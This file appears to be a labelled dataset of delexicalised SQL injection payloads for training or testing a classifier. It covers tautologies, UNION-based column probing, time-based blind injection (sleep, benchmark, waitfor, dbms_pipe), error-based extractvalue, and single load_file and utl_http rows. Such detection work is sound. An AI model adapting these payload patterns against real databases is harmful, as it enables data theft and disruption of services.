payload_delex,type_id
"__INT__' ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
waitfor __IDENT__ __STR__ and ( __STR__ = ',6
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ ) ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and ( ( ( __IDENT__",3
"__INT__ ) ) ) union all select null , null , null , null , null , null , null , null , null --",7
-__INT__ % ' or __INT__ = __INT__#,2
-__INT__ ) or __INT__ = __INT__ --,2
__INT__' ) ) ) rlike sleep ( __INT__ ) #,6
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__ % "" ) ) ) and sleep ( __INT__ ) #",6
end and ( ( ( __STR__ = ',2
"-__INT__"" or ( __INT__ = __INT__ ) * __INT__",2
"-__INT__ % or elt ( __INT__ = __INT__ , __INT__ ) and % __STR__",2
__IDENT__ __IDENT__,0
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"waitfor __IDENT__ __STR__ and ( ( ( __STR__ = ""__IDENT__",6
-__INT__' ) ) or __INT__ = __INT__,2
"__INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"-__INT__"" ) where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
-__INT__' ) or __INT__ = __INT__,2
"-__INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__ ;,2
"-__INT__"" ) where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
__INT__ % ' ) ) ) order by __INT__ --,0
"__INT__ and elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
"__INT__"" where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) #",6
"-__INT__"" ) ) or __INT__ = __INT__ --",2
"__INT__"" where __INT__ = __INT__ rlike sleep ( __INT__ ) #",6
__INT__ ) and sleep ( __INT__ ) and ( __IDENT__,6
"__INT__' in __IDENT__ __IDENT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) #",2
delete from __IDENT__,2
"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
"__INT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
end and ( __STR__ = ',2
"__INT__ ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --",0
"-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
waitfor __IDENT__ __STR__ and ( ( ( __STR__ = '__IDENT__,6
1__STR__sgjj__STR__sgjj,2
"__INT__"" ) ) ) and __INT__ = __INT__#",2
select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,7
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
-__INT__' ) or __INT__ = __INT__,2
"-__INT__"" union all select __INT__#",7
__INT__ % ' ) and __INT__ = __INT__ --,2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
-6561__STR__azqp__STR__azqp,2
 or __INT__ = __INT__ --,2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
-__INT__' where __INT__ = __INT__ or __INT__ = __INT__#,2
delete from __IDENT__ where __IDENT__ = __STR__,2
-__INT__ % __STR__ % __STR__,2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
__INT__ ) ) ) or sleep ( __INT__ ) and ( ( ( __IDENT__,6
__INT__ ) rlike sleep ( __INT__ ) and ( __IDENT__,6
__INT__' in __IDENT__ __IDENT__ ) and ( __INT__ = __INT__ ) * __INT__#,2
-__INT__' ) or __INT__ = __INT__ --,2
"-__INT__' or __IDENT__ ( __INT__ = __INT__ , __INT__ )",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --",2
"__INT__' in __IDENT__ __IDENT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null --",7
delete from __IDENT__,2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ --",7
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __INT__ = __INT__",2
"-__INT__ ) or elt ( __INT__ = __INT__ , __INT__ ) and ( __INT__ = __INT__",2
__INT__ ) waitfor __IDENT__ __TIME__,6
"__INT__"" ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"end and ( ( __STR__ = ""__IDENT__",2
"__INT__ ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( __IDENT__",6
__INT__ % __STR__ % __STR__,2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null --",7
-__INT__ % __STR__ % __STR__,2
"__INT__"" ) where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null , null --",7
"-__INT__ ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
-__INT__ or ( __INT__ = __INT__ ) * __INT__,2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null , null , null --",7
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__",2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"1__STR__vixv' from dual where __INT__ = __INT__ union all select null , null , null , null , null --",7
"__INT__ union select __IDENT__ , null from information_schema . __IDENT__ limit __INT__ --",7
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) -- __IDENT__",0
"-__INT__ ) or __IDENT__ ( __INT__ = __INT__ , __INT__ )",2
-__INT__ or __INT__ = __INT__ --,2
"__INT__ % "" and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
-__INT__ ) ) ) or __INT__ = __INT__#,2
__INT__ ) ) rlike sleep ( __INT__ ) #,6
"__INT__' or \. < __INT__ union select __INT__ , @@__IDENT__ -- __INT__",7
"__INT__"" ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ % "" and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
__INT__ ) and ( __INT__ = __INT__ ) * __INT__ and ( __INT__ = __INT__,2
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --",2
-7125__STR__fbwo__STR__fbwo,2
__INT__' ) where __INT__ = __INT__ and sleep ( __INT__ ) #,6
"__INT__ % ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( % __STR__",6
__INT__ and ( __INT__ = __INT__ ) * __INT__,2
__INT__' ) ) order by __INT__ --,0
"__INT__ ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"1__STR__tzey' where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null --",7
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
-__INT__' where __INT__ = __INT__ or __INT__ = __INT__#,2
-__INT__' ) ) or __INT__ = __INT__ --,2
-__INT__ where __INT__ = __INT__ order by __INT__#,0
__INT__ % ' ) ) ) rlike sleep ( __INT__ ) #,6
delete from __IDENT__,2
"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
"__INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__ ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"__INT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__' ) ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
-__INT__ ) or ( __INT__ = __INT__ ) * __INT__,2
"__INT__ ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ )",3
"__INT__ % ) or __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( % __STR__",6
"__INT__ and elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
delete from __IDENT__,2
__INT__ % ' and __INT__ = __INT__,2
1__STR__grfi__STR__grfi,2
"__INT__ % "" union all select null , null , null , null , null , null --",7
or __STR__ = '__IDENT__,2
end and ( ( __STR__ like '__IDENT__,2
-8429__STR__bwih__STR__bwih,2
-__INT__ ) ) union all select __INT__#,7
1__STR__tdyr__STR__tdyr,2
"__INT__"" and __INT__ = __INT__#",2
-__INT__' union all select __INT__ --,7
-__INT__' ) or __INT__ = __INT__#,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__' in __IDENT__ __IDENT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__' ) ) ) and __INT__ = __INT__ --,2
"or __INT__ = __INT__ #""",2
"__INT__' ) where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__' ) ) ) and __INT__ = __INT__#,2
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
or __INT__ = __INT__ --,2
"__INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and __IDENT__",3
"__INT__"" or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null )",2
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__"" and __INT__ = __INT__",2
-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,2
", ( select ( case when ( [__IDENT__] = [__IDENT__] ) then ( select __IDENT__ ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) else [__IDENT__] * ( select [__IDENT__] union all select [__IDENT__] ) end ) ) , ( select ( case when ( [__IDENT__] ) then ( select __IDENT__ ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) else [__IDENT__] * ( select [__IDENT__] union all select [__IDENT__] ) end ) )",7
__INT__ ) waitfor __IDENT__ __IDENT__,6
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
__INT__ % ' ) rlike sleep ( __INT__ ) #,6
select __IDENT__ from __IDENT__ union all select __IDENT__ from like order by __IDENT__,7
"end and __STR__ = ""__IDENT__",2
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) ) || '",0
__INT__' + ( select __IDENT__ where __INT__ = __INT__ union all select null#,7
"-__INT__"" ) where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
__INT__ where __INT__ = __INT__ or sleep ( __INT__ ) --,6
"insert into __IDENT__ ( __IDENT__ , from , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
__INT__ and __INT__ = __INT__ -- __IDENT__,2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null#",7
1__STR__niux__STR__niux,2
"__INT__' ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ ) # __IDENT__",2
-__INT__ % ' ) or __INT__ = __INT__#,2
__INT__' and __INT__ = __INT__ --,2
"-__INT__"" ) ) or __INT__ = __INT__",2
"__INT__ % __IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"-__INT__"" ) ) order by __INT__ --",0
"-__INT__"" ) ) or __INT__ = __INT__",2
"__INT__ ; ( load_file ( char ( __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , ...",4
1__STR__bjee__STR__bjee,2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ order by __INT__#",0
"__INT__' ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null --",7
-__INT__ % ' ) or __INT__ = __INT__#,2
"-__INT__' ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"-__INT__' ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( ( __IDENT__",6
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
waitfor __IDENT__ __STR__ and ( ( ( __INT__ = __INT__,6
or __IDENT__ like char ( __INT__ ) ;,2
"-__INT__"" or __INT__ = __INT__",2
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
"end and ( ( __STR__ like ""__IDENT__",2
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__' ) ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
-__INT__' or __INT__ = __INT__ --,2
"waitfor __IDENT__ __STR__ and ( __STR__ = ""__IDENT__",6
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__ % or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and % __STR__",6
"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __INT__ = __INT__",2
-9484__STR__fcsa__STR__fcsa,2
"__INT__"" where __INT__ = __INT__ and __INT__ = __INT__ --",2
-__INT__ or __INT__ = __INT__,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ ) ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( ( __INT__ = __INT__",6
"__INT__ % "" ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
__IDENT__'#,1
"-__INT__"" or __INT__ = __INT__ --",2
__INT__ and __INT__ = __INT__,2
delete from __IDENT__ where __IDENT__ = __STR__,2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where by = __IDENT__",2
"__INT__' ) ) ) union all select null , null , null , null --",7
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) )",6
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__ % ' ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
-__INT__' ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --,2
__INT__ ) and __INT__ = __INT__,2
end and __STR__ = '__IDENT__,2
select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,7
"-__INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) # __IDENT__",2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ % ' ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ and elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
"__INT__"" union all select null , null , null , null --",7
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__ % __IDENT__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and % __STR__",6
"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
""" or true --",2
__INT__ ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) #,6
"__INT__ ) or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) )",6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,7
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
delete from __IDENT__,2
"select __IDENT__ , __IDENT__ from __IDENT__ __IDENT__ = __IDENT__ all select __IDENT__ , __IDENT__ from __IDENT__",7
"update __IDENT__ set right = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"-__INT__ % "" ) ) ) or __INT__ = __INT__",2
"-__INT__ ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
__IDENT__ __IDENT__ . sleep ( __INT__ ),6
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"insert into __IDENT__ ( group , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
__INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__#,2
delete from __IDENT__,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__' < @$__IDENT__ union select __INT__ , __IDENT__ ( ) -- __INT__",7
__INT__ % ' or sleep ( __INT__ ) #,6
"__INT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
-__INT__' ) ) ) or __INT__ = __INT__#,2
"__INT__ % ' ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ % "" ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__",2
__INT__ and __INT__ = __INT__ --,2
-__INT__' order by __INT__ --,0
1__STR__ciyc__STR__ciyc,2
-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__#,2
"__INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and __IDENT__",6
1__STR__sxgl__STR__sxgl,2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __STR__ = '__IDENT__",2
"__INT__' + ( select __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null#",7
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __STR__ = """,2
|| utl_http . __IDENT__,4
